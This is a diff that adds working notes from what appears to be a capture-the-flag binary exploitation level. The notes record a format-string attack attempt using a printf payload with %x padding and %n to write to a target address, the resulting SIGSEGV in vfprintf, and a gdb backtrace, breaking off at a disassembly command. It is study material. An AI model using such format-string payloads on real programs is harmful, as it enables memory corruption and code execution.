@@ -1,1 +1,28 @@
 https://cs155.stanford.edu/papers/formatstring-1.2.pdf
+
+
+======================================================
+
+currently ongoing:
+	- Trying to write in m addr via printf
+
+
+got a SIGSEGV by trying write an address with some padding:
+	(gdb) r
+	The program being debugged has been started already.
+	Start it from the beginning? (y or n) y
+	Starting program: /home/user/level3/level3
+	\x8c\x98\x04\x08_%08x.%08x.%08x.%08x.%08x.%n -> this line made crash
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+
+
+it shows that it crash specifically at the line of the compare:
+
+	(gdb) backtrace
+	#0  0xb7e7312c in vfprintf () from /lib/i386-linux-gnu/libc.so.6
+	#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
+	#2  0x080484da in v ()
+	#3  0x08048525 in main ()
+	(gdb) disas v
